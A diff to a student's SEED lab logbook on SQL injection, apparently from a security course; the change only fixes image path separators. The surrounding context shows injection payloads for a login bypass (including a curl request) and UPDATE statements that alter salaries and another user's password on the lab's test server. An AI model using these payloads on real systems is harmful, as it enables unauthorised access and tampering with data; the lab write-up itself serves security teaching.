@@ -20,18 +20,18 @@ the web application, we'll be using has 2 types of users with different priville
 * Employee : can only manage their own profile information
 * Administrator : can manage every employee's profile information
 
-![Alt text](images\logbook8\image.png)
+![Alt text](images/logbook8/image.png)
 
 
 ## Task 1: Get Familiar with SQL statements
 
 After running dcbuild and dcup to get the docker containers running, we have access to the database created in the container 4a12f793dd50.
 
-![Alt text](images\logbook8\image-1.png)
+![Alt text](images/logbook8/image-1.png)
 
 And are able to query the database as such:
 
-![Alt text](images\logbook8\image-alice.png)
+![Alt text](images/logbook8/image-alice.png)
 
 
 ## Task 2: SQL Injection Attack On Select Statement
@@ -75,7 +75,7 @@ Since the $input_uname user input is not handled properly, all there is to do is
 ``` SQL
 Admin' -- 
 ```
-![Alt text](images\logbook8\image-2.1.png)
+![Alt text](images/logbook8/image-2.1.png)
 
 
 ### Task 2.2: SQL Injection from control Line
@@ -87,13 +87,13 @@ curl 'www.seed-server.com/unsafe_home.php?username=admin%27%20--%20'
 
 ```
 
-![Alt text](images\logbook8\image-2.2.png)
+![Alt text](images/logbook8/image-2.2.png)
 
 ### Task 2.3: Append a new SQL statement
 
 Since the php code is only expecting a query, it will run the sql code until it finds a ';' therefore making it impossible to append multiple SQL statements.
 
-![Alt text](images\logbook8\image-2.3.png)
+![Alt text](images/logbook8/image-2.3.png)
 
 ## Task 3
 
@@ -124,7 +124,7 @@ Input:
 ```
 Alice',salary='10
 ```
-![Alt text](images\logbook8\image-3.1.png)
+![Alt text](images/logbook8/image-3.1.png)
 
 
 ### Task 3.2 Change the boss's salary
@@ -137,7 +137,7 @@ Input:
 Alice', salary=1 where Name='Admin' -- 
 ```
 
-![Alt text](images\logbook8\image-3.2.png)
+![Alt text](images/logbook8/image-3.2.png)
 
 ### Task 3.3 
 
@@ -148,5 +148,5 @@ Input:
 Alice', password=sha1('FSI') where Name = 'Boby' -- 
 ```
 
-![Alt text](images\logbook8\image-3.3.png)
+![Alt text](images/logbook8/image-3.3.png)
 
